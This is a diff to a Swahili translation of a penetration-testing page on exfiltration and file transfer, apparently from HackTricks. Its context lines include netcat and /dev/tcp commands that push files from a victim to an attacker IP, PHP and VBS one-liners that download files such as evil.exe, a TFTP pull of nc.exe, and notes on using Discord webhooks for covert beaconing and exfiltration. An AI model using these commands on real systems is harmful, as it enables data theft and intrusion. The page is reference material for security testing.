@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Domains zinazoruhusiwa mara nyingi (whitelisted) kwa ajili ya exfiltrate taarifa
+> [!TIP]
+> Kwa mfano kuanzia mwanzo hadi mwisho wa staging loot katika `C:\Users\Public` na exfiltrating kwa Rclone ili kuiga legitimate backups, angalia mtiririko wa kazi hapa chini.
 
-Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domains zinazoruhusiwa mara nyingi (whitelisted) ambazo zinaweza kutumiwa vibaya
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Domains zinazowekwa whitelisted kwa kawaida ili exfiltrate taarifa
+
+Angalia [https://lots-project.com/](https://lots-project.com/) ili kupata domains zinazowekwa whitelisted kwa kawaida ambazo zinaweza kutumiwa vibaya
 
 ## Nakili\&Bandika Base64
 
@@ -42,7 +49,7 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Kupakia faili
+### Kupakia mafaili
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) kwa C2 & Data Exfiltration
 
-Webhooks ni write-only HTTPS endpoints zinazopokea JSON na sehemu za faili za hiari. Mara nyingi huruhusiwa kwa domain za SaaS zenye kuaminika na hazihitaji OAuth/API keys, hivyo zinatumika vizuri kwa beaconing na exfiltration zisizo na vizingiti.
+Webhooks ni endpoints za HTTPS za kuandika tu ambazo zinakubali JSON na sehemu za faili za hiari. Mara nyingi zinaruhusiwa kwenye domain za SaaS zinazotumika kuaminika na hazihitaji OAuth/API keys, hivyo zinafaa kwa beaconing na exfiltration kwa njia rahisi.
 
-Key ideas:
+Mambo muhimu:
 - Endpoint: Discord inatumia https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK huthibitisha utolewaji.
+- POST multipart/form-data na sehemu iitwayo payload_json yenye {"content":"..."} pamoja na sehemu za faili za hiari zikiitwa file.
+- Mfumo wa mzunguko wa operator: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK zinathibitisha utolewaji.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,7 +185,7 @@ Start-Sleep -Seconds 20
 }
 ```
 Vidokezo:
-- Mifumo sawa inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) yanayotumia incoming webhooks; rekebisha URL na JSON schema ipasavyo.
+- Mifano sawa inatumika kwa majukwaa mengine ya ushirikiano (Slack/Teams) yanayotumia incoming webhooks; rekebisha URL na JSON schema ipasavyo.
 - Kwa DFIR ya Discord Desktop cache artifacts na webhook/API recovery, angalia:
 
 {{#ref}}
@@ -187,12 +194,12 @@ Vidokezo:
 
 ## FTP
 
-### FTP seva (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### Seva ya FTP (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -235,7 +242,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Au unda smb share **kwa kutumia samba**:
+Au unda smb share **kutumia samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Mshambuliaji lazima awe na SSHd ikiendesha.
+Mshambuliaji lazima awe na SSHd ikifanya kazi.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Ikiwa mwathirika ana SSH, mshambuliaji anaweza mount directory kutoka kwa mwathirika hadi kwa mshambuliaji.
+Ikiwa victim ana SSH, attacker anaweza ku-mount directory kutoka kwa victim hadi attacker.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -284,14 +291,14 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Pakia faili kwa mwanaathiriwa
+### Pakia faili kwa mwathirika
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-asante kwa **@BinaryShadow\_**
+Shukrani kwa **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -313,33 +320,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda seva ya SMTP ili kupokea data kwa python:
+Ikiwa unaweza kutuma data kwa seva ya SMTP, unaweza kuunda SMTP ili kupokea data kwa kutumia python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Kwa chaguo-msingi katika XP na 2003 (kwa mengine inahitaji kuongezwa wazi wakati wa usakinishaji)
+Kawaida kwenye XP na 2003 (kwa zingine inapaswa kuongezwa wazi wakati wa usakinishaji)
 
-Katika Kali, **start TFTP server**:
+Kwenye Kali, **anzisha seva ya TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Seva ya TFTP kwa python:**
+**TFTP server kwa python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Katika **victim**, ungana na server ya Kali:
+Katika **victim**, ungana na seva ya Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pakua faili kwa oneliner ya PHP:
+Pakua faili kwa kutumia PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -347,7 +354,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Mwanaathiriwa**
+**Mwenyeathirika**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga upya kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kutengeneza faili ya binary. Hata hivyo, ni muhimu kutambua kwamba debug.exe ina **kikomo cha assembling faili hadi ukubwa wa 64 kb**.
+Programu ya `debug.exe` si tu inaruhusu ukaguzi wa binaries bali pia ina **uwezo wa kuzijenga tena kutoka hex**. Hii inamaanisha kwamba kwa kutoa hex ya binary, `debug.exe` inaweza kuzalisha faili ya binary. Walakini, ni muhimu kutambua kwamba debug.exe ina **kizuizi katika assembling faili hadi ukubwa wa 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kisha copy-paste maandishi hayo kwenye windows-shell na faili iitwayo nc.exe itaumbwa.
+Kisha nakili na ubandike maandishi hayo kwenye windows-shell, faili inayoitwa nc.exe itaumbwa.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
